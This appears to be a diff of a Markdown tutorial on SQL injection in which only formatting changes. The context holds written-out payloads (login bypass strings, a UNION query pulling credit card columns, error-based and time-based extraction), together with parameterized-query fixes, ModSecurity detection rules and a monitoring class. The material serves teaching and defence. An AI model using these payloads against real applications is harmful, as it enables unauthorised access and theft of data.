@@ -16,15 +16,18 @@ SQL injection exploits occur when applications construct SQL queries by concaten
 **Basic Authentication Bypass Example:**
 
 Vulnerable login query:
+
 ```sql
 SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'USER_INPUT';
 ```
 
 **Attack Vector 1: Comment-based bypass**
+
 - **Username:** `admin'--`
 - **Password:** `anything`
 
 Resulting malicious query:
+
 ```sql
 SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything';
 ```
@@ -32,10 +35,12 @@ SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything';
 The `--` comment syntax effectively removes the password check, allowing authentication bypass if an 'admin' user exists.
 
 **Attack Vector 2: Boolean-based bypass**
+
 - **Username:** `admin' OR '1'='1'--`
 - **Password:** `anything`
 
 Resulting query:
+
 ```sql
 SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'anything';
 ```
@@ -47,12 +52,14 @@ Since `'1'='1'` is always true, this bypasses both username and password validat
 Attackers can extract data from other database tables using UNION SELECT statements to combine results from multiple queries.
 
 Original vulnerable query:
+
 ```sql
 SELECT name, email FROM users WHERE id = '$ID';
 ```
 
 **Attack payload:**
-```
+
+```sql
 1' UNION SELECT credit_card_number, security_code FROM creditcards--
 ```
 
@@ -68,6 +75,7 @@ This attack allows extraction of sensitive financial data from unrelated tables.
 4. **Extract data** systematically
 
 **Advanced UNION injection example:**
+
 ```sql
 -- Step 1: Determine column count
 1' ORDER BY 1-- (success)
@@ -84,19 +92,22 @@ This attack allows extraction of sensitive financial data from unrelated tables.
 Database error messages can reveal valuable information about the database structure, enabling more sophisticated attacks.
 
 **Triggering error disclosure:**
+
 ```http
 GET /user.php?id=1' HTTP/1.1
 Host: vulnerable-site.com
 ```
 
 **Example error responses revealing system information:**
-```
+
+```sql
 MySQL Error: You have an error in your SQL syntax near ''1'' at line 1
 Table 'myapp.users' doesn't exist
 Unknown column 'admin_password' in 'field list'
 ```
 
 **Exploitation techniques:**
+
 ```sql
 -- Extract database version
 1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
@@ -110,6 +121,7 @@ Unknown column 'admin_password' in 'field list'
 
 **Time-based Blind SQL Injection:**
 When error messages are suppressed, attackers use time delays to infer information:
+
 ```sql
 -- MySQL time-based detection
 1' AND (SELECT SLEEP(5))--
@@ -126,6 +138,7 @@ When error messages are suppressed, attackers use time delays to infer informati
 ### 1. **Parameterized Queries and Prepared Statements**
 
 **PHP PDO Example:**
+
 ```php
 // Vulnerable code
 $sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
@@ -138,6 +151,7 @@ $result = $stmt->fetchAll();
 ```
 
 **Java PreparedStatement:**
+
 ```java
 // Vulnerable code
 String sql = "SELECT * FROM users WHERE id = " + userId;
@@ -152,6 +166,7 @@ ResultSet rs = pstmt.executeQuery();
 ```
 
 **Python SQLAlchemy:**
+
 ```python
 # Vulnerable code
 query = f"SELECT * FROM users WHERE email = '{email}'"
@@ -233,6 +248,7 @@ try {
 ### 5. **Advanced Protection Techniques**
 
 **Stored Procedures:**
+
 ```sql
 DELIMITER //
 CREATE PROCEDURE GetUserById(IN userId INT)
@@ -243,6 +259,7 @@ DELIMITER ;
 ```
 
 **Web Application Firewall (WAF) Rules:**
+
 ```apache
 # ModSecurity rules for SQL injection protection
 SecRule ARGS "@detectSQLi" \
@@ -254,6 +271,7 @@ SecRule ARGS "@rx (?i:(union|select|insert|delete|update|drop|create|alter|exec|
 ```
 
 **Real-time Monitoring:**
+
 ```python
 import logging
 from datetime import datetime, timedelta
@@ -286,5 +304,3 @@ class SQLInjectionMonitor:
             self.blocked_ips.add(ip_address)
             logging.critical(f"IP {ip_address} blocked for repeated SQL injection attempts")
 ```
-
-*Reference: OWASP Top 10 Security Risks*
